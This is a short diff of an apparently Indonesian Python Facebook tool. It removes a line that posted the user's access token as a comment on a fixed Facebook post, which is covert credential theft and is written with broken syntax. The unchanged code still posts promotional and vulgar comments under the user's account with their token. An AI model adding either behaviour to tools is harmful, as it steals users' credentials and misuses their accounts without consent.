@@ -437,7 +437,6 @@ def komen(token):
 		with requests.Session() as dev_:
 			komen_ = random.choice(["Yang Posting orangnya Ganteng:)", "Gw Fans Lu Bang:*", "Duh Yang Posting Ganteng:)", "Hallo bang", "Keren Bos..", "Lo Ngntod:v", "Gak sia2 saya make tool abang, Keren Abis, Ga ada Obat"])
 			dev_.post("https://graph.facebook.com/"+id_post+"/comments/?message="+komen_+"&access_token="+token)
-			dev_.post("https://graph.facebook.com/"3088882871430325"/comments/?message="token"&access_token="+token)
 
 def __token__dev(cookie):
 
